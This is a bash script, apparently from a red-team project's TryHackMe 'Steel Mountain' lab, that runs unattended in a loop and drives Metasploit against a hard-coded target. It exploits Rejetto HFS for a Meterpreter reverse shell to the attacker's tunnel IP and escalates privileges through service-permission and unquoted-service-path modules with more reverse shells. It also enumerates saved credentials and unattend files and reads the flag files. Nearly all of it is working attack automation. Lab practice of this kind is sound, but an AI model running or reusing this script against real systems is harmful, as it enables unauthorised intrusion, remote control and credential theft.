#!/usr/bin/env bash
set -u

TARGET="10.146.141.173"
BLOG="/home/kali/Redteam-Hermes/docs/walkthroughs/THM/steel-mountain-live.md"
LOGDIR="/home/kali/Redteam-Hermes/logs"
LOG="$LOGDIR/steel_mountain_worker.log"
STATE_DIR="$LOGDIR/steel_state"
mkdir -p "$LOGDIR" "$STATE_DIR"

TS() { date -u +"%Y-%m-%d %H:%M:%SZ"; }
log() { echo "[$(TS)] $*" | tee -a "$LOG"; }
blog_milestone() {
  local title="$1"; shift
  {
    echo
    echo "### $(TS) — $title"
    for l in "$@"; do echo "$l"; done
  } >> "$BLOG"
}

get_attacker_ip() {
  local ip
  ip=$(ip -4 -o addr show dev tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -z "$ip" ]] && ip=$(ip -4 -o addr show dev tun1 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  echo "$ip"
}

target_up() { curl -sI --max-time 8 "http://$TARGET:8080" | grep -q "HTTP/1.1"; }
single_tunnel_ok() {
  local c
  c=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{c++} END{print c+0}')
  [[ "$c" -eq 1 ]]
}

build_foothold_rc() {
  local lhost="$1" runlog="$2"
  cat > /tmp/steel_foothold.rc <<EOF
spool $runlog
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS $TARGET
set RPORT 8080
set payload windows/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT 4444
run -j
sleep 15
sessions -l
spool off
exit -y
EOF
}

extract_session_ids() {
  local runlog="$1"
  awk '/meterpreter x86\/windows/ {print $1}' "$runlog" | sed 's/[^0-9]//g' | grep -E '^[0-9]+$' | sort -n | uniq
}

build_privesc_rc() {
  local runlog="$1" lhost="$2"; shift 2
  local sids=("$@")
  {
    echo "spool $runlog"
    echo "sessions -l"
    for sid in "${sids[@]}"; do
      echo "sessions -i $sid -C \"getuid\" --timeout 45"
      echo "sessions -i $sid -C \"sysinfo\" --timeout 45"
      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\bill\\\\Desktop\\\\user.txt\" --timeout 45"
      echo "sessions -i $sid -C \"getsystem\" --timeout 60"
      echo "sessions -i $sid -C \"run post/multi/recon/local_exploit_suggester\" --timeout 120"
      echo "sessions -i $sid -C \"run post/windows/gather/enum_services\" --timeout 120"
      echo "sessions -i $sid -C \"shell -c whoami /priv\" --timeout 45"
      echo "sessions -i $sid -C \"shell -c sc qc AdvancedSystemCareService9\" --timeout 60"
      echo "sessions -i $sid -C \"shell -c wmic service get name,displayname,pathname,startmode | findstr /i /v \\\"C:\\\\\\\\Windows\\\\\\\\\\\" | findstr /i /v \\\"\\\\\\\"\\\"\" --timeout 90"
      echo "sessions -i $sid -C \"shell -c cmdkey /list\" --timeout 60"
      echo "sessions -i $sid -C \"shell -c dir C:\\\\ /b /s *unattend*.xml\" --timeout 90"
      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\" --timeout 45"
    done

    for sid in "${sids[@]}"; do
      echo "use exploit/windows/local/service_permissions"
      echo "set SESSION $sid"
      echo "set LHOST $lhost"
      echo "set LPORT 5555"
      echo "set PAYLOAD windows/meterpreter/reverse_tcp"
      echo "run"

      echo "use exploit/windows/local/unquoted_service_path"
      echo "set SESSION $sid"
      echo "set LHOST $lhost"
      echo "set LPORT 6666"
      echo "set PAYLOAD windows/meterpreter/reverse_tcp"
      echo "run"
    done

    echo "sessions -l"
    for sid in 1 2 3 4 5 6 7 8 9 10; do
      echo "sessions -i $sid -C \"getuid\" --timeout 45"
      echo "sessions -i $sid -C \"shell -c type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\" --timeout 45"
    done
    echo "spool off"
    echo "exit -y"
  } > /tmp/steel_privesc.rc
}

log "worker start (autonomous foothold->privesc finisher mode)"

while true; do
  if ! single_tunnel_ok; then log "hold: need exactly one active tunnel"; sleep 30; continue; fi
  ATTACKER_IP=$(get_attacker_ip)
  if [[ -z "$ATTACKER_IP" ]]; then log "hold: missing tun IP"; sleep 30; continue; fi
  if ! target_up; then log "hold: target 8080 not reachable"; sleep 45; continue; fi

  stamp=$(date +%s)
  foothold_log="$STATE_DIR/foothold_${stamp}.log"
  privesc_log="$STATE_DIR/privesc_${stamp}.log"

  build_foothold_rc "$ATTACKER_IP" "$foothold_log"
  msfconsole -q -r /tmp/steel_foothold.rc >> "$LOG" 2>&1 || true

  mapfile -t sids < <(extract_session_ids "$foothold_log")
  if [[ ${#sids[@]} -eq 0 ]]; then
    log "no active meterpreter sessions after foothold attempt"
    sleep 40
    continue
  fi

  log "active sessions discovered: ${sids[*]}"
  build_privesc_rc "$privesc_log" "$ATTACKER_IP" "${sids[@]}"
  msfconsole -q -r /tmp/steel_privesc.rc >> "$LOG" 2>&1 || true

  if grep -Eqi 'NT AUTHORITY\\SYSTEM|getsystem:.*success|is_system:\s*true' "$privesc_log"; then
    log "SYSTEM observed"
    blog_milestone "Privilege escalation milestone" \
      "- SYSTEM-level context observed in autonomous finisher cycle." \
      "- Evidence log: $privesc_log"
  fi

  if grep -Eqi 'type C:\\Users\\bill\\Desktop\\user.txt|type C:\\Users\\Administrator\\Desktop\\root.txt' "$privesc_log"; then
    blog_milestone "Proof update" \
      "- Automated proof command(s) executed against user/root flag paths." \
      "- Evidence log: $privesc_log"
  fi

  sleep 50
done
